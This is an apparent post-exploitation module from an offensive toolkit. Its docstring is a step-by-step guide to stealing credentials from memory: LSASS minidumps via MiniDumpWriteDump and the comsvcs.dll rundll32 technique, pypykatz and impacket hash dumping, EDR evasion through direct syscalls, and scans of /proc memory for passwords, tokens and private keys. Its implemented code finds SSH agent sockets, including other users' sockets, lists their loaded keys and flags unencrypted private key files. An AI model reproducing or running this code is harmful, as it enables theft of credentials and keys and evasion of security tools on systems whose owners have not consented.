"""STUB — In-memory credential extraction.

Extracts credentials from process memory.  The primary targets are:
  - Windows LSASS (NT hashes, Kerberos tickets, WDigest cleartext)
  - Linux SSH agent socket (loaded private keys)
  - Running processes storing secrets in heap (env vars, config)

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

WINDOWS — LSASS DUMP
--------------------
LSASS (Local Security Authority Subsystem Service) holds NT password hashes,
Kerberos tickets, and (on older configs) WDigest cleartext passwords in memory.

Step 1: Get the LSASS PID:
  import subprocess
  out = subprocess.run(
      ["powershell", "-c",
       "Get-Process lsass | Select-Object -ExpandProperty Id"],
      capture_output=True, text=True
  )
  lsass_pid = int(out.stdout.strip())

Step 2a: Create a minidump via MiniDumpWriteDump (needs SeDebugPrivilege):
  import ctypes, ctypes.wintypes
  PROCESS_ALL_ACCESS = 0x1F0FFF
  MiniDumpWithFullMemory = 2

  dbghelp   = ctypes.windll.dbghelp
  kernel32  = ctypes.windll.kernel32

  handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
  dump_file = open("C:\\\\Windows\\\\Temp\\\\lsass.dmp", "wb")
  dbghelp.MiniDumpWriteDump(
      handle, lsass_pid, dump_file.fileno(),
      MiniDumpWithFullMemory, None, None, None
  )
  dump_file.close()
  kernel32.CloseHandle(handle)

Step 2b: Stealthier — use comsvcs.dll (rundll32 lolbin, no DBGHELP needed):
  subprocess.run([
      "rundll32.exe",
      "C:\\\\Windows\\\\System32\\\\comsvcs.dll",
      "MiniDump", str(lsass_pid), "C:\\\\Windows\\\\Temp\\\\lsass.dmp", "full"
  ])

Step 2c: Even stealthier — direct syscalls or Cobalt Strike's `sekurlsa::minidump`
  bypasses EDR hooks on NtOpenProcess / NtReadVirtualMemory.
  Python: use ctypes to call NtOpenProcess / NtReadVirtualMemory directly from ntdll,
  bypassing any user-mode hooks placed by AV/EDR in OpenProcess.

Step 3: Parse the dump with pypykatz (pure Python, no Mimikatz binary needed):
  pip install pypykatz
  from pypykatz.pypykatz import pypykatz
  results = pypykatz.parse_minidump_file("lsass.dmp")
  for luid, session in results.logon_sessions.items():
      print(session.username, session.domain, session.nt_hash)
      for cred in session.wdigest:
          print("WDigest:", cred.username, cred.password)   # only pre-KB2871997

Alternative: impacket secretsdump (operates on SAM/SYSTEM/SECURITY hive exports):
  from impacket.examples.secretsdump import LocalOperations, SAMHashes
  ops = LocalOperations("system.hive")
  bootkey = ops.getBootKey()
  sam = SAMHashes("sam.hive", bootkey, isRemote=False)
  sam.dump()

Defender/EDR evasion notes:
  - Dump to a non-obvious path: C:\\Windows\\Temp\\<random>.tmp
  - Use direct syscalls (SysWhispers3) to avoid API hooking
  - PPL (Protected Process Light) on LSASS requires a kernel driver to bypass
    (RunAsPPL registry key; check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL)
  - Credential Guard (Virtualization Based Security) stores secrets in a
    separate hypervisor process — pypykatz/mimikatz cannot extract from it


LINUX — SSH AGENT SOCKET
-------------------------
The SSH agent holds loaded private keys in memory.  If $SSH_AUTH_SOCK is set,
you can list and export them without the passphrase.

  import os, socket, struct

  sock_path = os.environ.get("SSH_AUTH_SOCK")
  if sock_path:
      s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
      s.connect(sock_path)

      # SSH_AGENTC_REQUEST_IDENTITIES = 11
      msg = struct.pack(">IB", 1, 11)   # length=1, type=11
      s.sendall(msg)
      resp_len = struct.unpack(">I", s.recv(4))[0]
      resp = s.recv(resp_len)
      # Parse SSH_AGENT_IDENTITIES_ANSWER (type=12):
      #   4 bytes: key count
      #   for each key: 4-byte blob length + blob, 4-byte comment length + comment
      nkeys = struct.unpack(">I", resp[1:5])[0]
      # ... parse each key blob (contains public key type + key material)

  Or use the paramiko library:
    import paramiko
    agent = paramiko.agent.Agent()
    for key in agent.get_keys():
        print(key.get_name(), key.get_base64())

  To export a private key from the agent (requires SSH_AGENTC_EXPORT from an agent
  that allows it — most don't by default; needs ssh-add -c or custom agent):
    Use ssh-keyscan on known_hosts targets, then attempt authentication with
    each loaded key to discover what it grants access to.


LINUX — /proc/<pid>/mem
-----------------------
Scan process memory for secrets (requires same UID or root, or ptrace_scope=0).

  import os, re

  def scan_proc_mem(pid: int, patterns: list[str]) -> list[str]:
      maps_path  = f"/proc/{pid}/maps"
      mem_path   = f"/proc/{pid}/mem"
      found = []
      try:
          with open(maps_path) as maps_f, open(mem_path, "rb") as mem_f:
              for line in maps_f:
                  parts = line.split()
                  if len(parts) < 2 or "r" not in parts[1]:
                      continue
                  start, end = (int(x, 16) for x in parts[0].split("-"))
                  if end - start > 100 * 1024 * 1024:
                      continue                    # skip huge mappings
                  mem_f.seek(start)
                  try:
                      chunk = mem_f.read(end - start)
                  except OSError:
                      continue
                  for pat in patterns:
                      for m in re.finditer(pat.encode(), chunk):
                          ctx = chunk[max(0, m.start()-30):m.end()+60]
                          found.append(ctx.decode("utf-8", errors="replace"))
      except (PermissionError, FileNotFoundError):
          pass
      return found

  # Example patterns to search for:
  patterns = [
      r"password[\"']?\\s*[:=]\\s*[\"']?[^\\s\"']{6,}",
      r"Bearer\\s+[A-Za-z0-9._-]{20,}",
      r"AWS_SECRET_ACCESS_KEY\\s*=\\s*[A-Za-z0-9/+]{40}",
      r"-----BEGIN\\s+(?:RSA|EC|OPENSSH)\\s+PRIVATE\\s+KEY-----",
  ]


macOS — TASK PORT / task_for_pid
---------------------------------
macOS uses Mach ports for inter-process communication.  task_for_pid() grants
full read/write access to a process's memory, analogous to OpenProcess on Windows.

  import ctypes
  libc = ctypes.CDLL("/usr/lib/libc.dylib")

  task = ctypes.c_uint32()
  # KERN_SUCCESS = 0; requires same UID or root, and target not SIP-protected
  ret = libc.task_for_pid(libc.mach_task_self(), pid, ctypes.byref(task))
  if ret == 0:
      # Now use mach_vm_read to read memory regions
      # mach_vm_read(task, address, size, data_out, data_size_out)
      pass

  Note: SIP-protected processes (system daemons) cannot be accessed this way
  even as root without disabling SIP (csrutil disable from Recovery Mode).


OUTPUT FORMAT
-------------
  {
    "source":   "lsass" | "ssh_agent" | "proc_scan",
    "username": "alice",
    "domain":   "CORP",
    "nt_hash":  "aad3b435...",    # or None
    "cleartext": "hunter2",       # or None
    "notes":    "WDigest",
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register



# ── SSH agent protocol helpers ─────────────────────────────────────────────────
# RFC 4253 / OpenSSH agent protocol: send REQUEST_IDENTITIES, read IDENTITIES_ANSWER

import glob
import os
import platform
import socket
import struct
from pathlib import Path

from post.base import ModuleResult, PostModule
from post.loader import register


def _agent_send(sock: socket.socket, msg_type: int, payload: bytes = b"") -> None:
    body = bytes([msg_type]) + payload
    sock.sendall(struct.pack(">I", len(body)) + body)


def _agent_recv(sock: socket.socket) -> tuple[int, bytes]:
    raw_len = _recv_exact(sock, 4)
    length = struct.unpack(">I", raw_len)[0]
    body = _recv_exact(sock, length)
    return body[0], body[1:]


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("SSH agent closed connection")
        buf += chunk
    return buf


def _read_string(data: bytes, offset: int) -> tuple[bytes, int]:
    length = struct.unpack_from(">I", data, offset)[0]
    return data[offset + 4: offset + 4 + length], offset + 4 + length


def _enumerate_ssh_agent(sock_path: str) -> list[dict]:
    """Connect to an SSH agent socket and list loaded keys."""
    SSH_AGENTC_REQUEST_IDENTITIES = 11
    SSH_AGENT_IDENTITIES_ANSWER   = 12

    results: list[dict] = []
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(sock_path)
        _agent_send(s, SSH_AGENTC_REQUEST_IDENTITIES)
        msg_type, payload = _agent_recv(s)
        s.close()

        if msg_type != SSH_AGENT_IDENTITIES_ANSWER:
            return [{"error": f"unexpected agent response: {msg_type}"}]

        count = struct.unpack_from(">I", payload, 0)[0]
        offset = 4
        for _ in range(count):
            key_blob, offset = _read_string(payload, offset)
            comment, offset  = _read_string(payload, offset)
            # Key type is the first string inside key_blob
            key_type_bytes, _ = _read_string(key_blob, 0)
            results.append({
                "socket":   sock_path,
                "key_type": key_type_bytes.decode("utf-8", errors="replace"),
                "comment":  comment.decode("utf-8", errors="replace"),
                "key_blob_len": len(key_blob),
            })
    except Exception as e:
        results.append({"socket": sock_path, "error": str(e)})

    return results


def _find_agent_sockets() -> list[str]:
    """Find SSH agent Unix domain sockets."""
    found: list[str] = []

    # 1. Current session's SSH_AUTH_SOCK
    env_sock = os.environ.get("SSH_AUTH_SOCK")
    if env_sock and Path(env_sock).exists():
        found.append(env_sock)

    # 2. Scan common agent socket locations
    patterns = [
        "/tmp/ssh-*/agent.*",
        "/tmp/ssh-*/S.ssh.*",
        "/run/user/*/gnupg/S.gpg-agent.ssh",
    ]
    for pat in patterns:
        for p in glob.glob(pat):
            if p not in found and Path(p).is_socket():
                found.append(p)

    # 3. Scan /proc/*/environ for SSH_AUTH_SOCK (Linux, requires read access)
    if Path("/proc").exists():
        for env_file in glob.glob("/proc/*/environ"):
            try:
                with open(env_file, "rb") as f:
                    env_data = f.read()
                for var in env_data.split(b"\x00"):
                    if var.startswith(b"SSH_AUTH_SOCK="):
                        sock = var.split(b"=", 1)[1].decode("utf-8", errors="replace")
                        if sock not in found and Path(sock).is_socket():
                            found.append(sock)
            except (PermissionError, ProcessLookupError, OSError):
                pass

    return found


def _find_ssh_keys() -> list[dict]:
    """Enumerate SSH private/public key files in common locations."""
    home = Path.home()
    key_names = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_ecdsa_sk", "id_ed25519_sk"]
    search_dirs = [home / ".ssh"]

    found: list[dict] = []
    for d in search_dirs:
        if not d.exists():
            continue
        for f in d.iterdir():
            if not f.is_file():
                continue
            entry: dict = {"path": str(f)}
            # Check if it's a known key filename (private key if no .pub suffix)
            if f.name in key_names:
                entry["type"] = "private_key"
                # Check for passphrase protection
                try:
                    first_line = f.read_text(errors="replace").split("\n", 1)[0]
                    entry["encrypted"] = "ENCRYPTED" in first_line
                except Exception:
                    entry["encrypted"] = "unknown"
            elif f.name.endswith(".pub"):
                entry["type"] = "public_key"
                try:
                    content = f.read_text().strip()
                    parts = content.split()
                    if parts:
                        entry["key_type"] = parts[0]
                    if len(parts) >= 3:
                        entry["comment"] = parts[2]
                except Exception:
                    pass
            elif f.name == "authorized_keys":
                entry["type"] = "authorized_keys"
                try:
                    lines = [l for l in f.read_text().splitlines() if l and not l.startswith("#")]
                    entry["entries"] = len(lines)
                except Exception:
                    pass
            elif f.name == "known_hosts":
                entry["type"] = "known_hosts"
                try:
                    lines = [l for l in f.read_text().splitlines() if l and not l.startswith("#")]
                    entry["hosts"] = len(lines)
                except Exception:
                    pass
            else:
                continue
            found.append(entry)
    return found


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class MemoryCredModule(PostModule):
    NAME        = "cred/memory"
    DESCRIPTION = "Enumerate SSH agent loaded keys, key files, and agent sockets"
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        lines: list[str] = []
        data: dict = {}

        # ── SSH agent sockets ─────────────────────────────────────────────────
        sockets = _find_agent_sockets()
        lines.append(f"SSH agent sockets found: {len(sockets)}")
        agent_keys: list[dict] = []
        for sock_path in sockets:
            keys = _enumerate_ssh_agent(sock_path)
            agent_keys.extend(keys)
            for k in keys:
                if "error" in k:
                    lines.append(f"  ! {sock_path}: {k['error']}")
                else:
                    lines.append(f"  [{k['key_type']}] {k['comment']} (via {sock_path})")

        if not sockets:
            lines.append("  (no SSH agent sockets found)")

        # ── SSH key files ─────────────────────────────────────────────────────
        lines.append("")
        key_files = _find_ssh_keys()
        privkeys = [k for k in key_files if k.get("type") == "private_key"]
        lines.append(f"SSH key files in ~/.ssh/: {len(key_files)}")
        for k in key_files:
            t = k.get("type", "?")
            path = k["path"]
            if t == "private_key":
                enc = "encrypted" if k.get("encrypted") else "UNENCRYPTED"
                lines.append(f"  [PRIVATE/{enc}] {path}")
            elif t == "public_key":
                comment = k.get("comment", "")
                lines.append(f"  [public/{k.get('key_type', '?')}] {path}  {comment}")
            elif t == "authorized_keys":
                lines.append(f"  [authorized_keys] {path} ({k.get('entries', '?')} entries)")
            elif t == "known_hosts":
                lines.append(f"  [known_hosts] {path} ({k.get('hosts', '?')} hosts)")

        # ── Summary ───────────────────────────────────────────────────────────
        lines.append("")
        lines.append(f"Summary: {len(agent_keys)} key(s) in agent, {len(privkeys)} private key file(s)")
        unencrypted = [k for k in privkeys if k.get("encrypted") is False]
        if unencrypted:
            lines.append(f"  ⚠  {len(unencrypted)} UNENCRYPTED private key(s):")
            for k in unencrypted:
                lines.append(f"       {k['path']}")

        data = {
            "agent_sockets": sockets,
            "agent_keys": agent_keys,
            "key_files": key_files,
            "unencrypted_private_keys": [k["path"] for k in unencrypted],
        }

        return ModuleResult(ok=True, output="\n".join(lines), data=data)
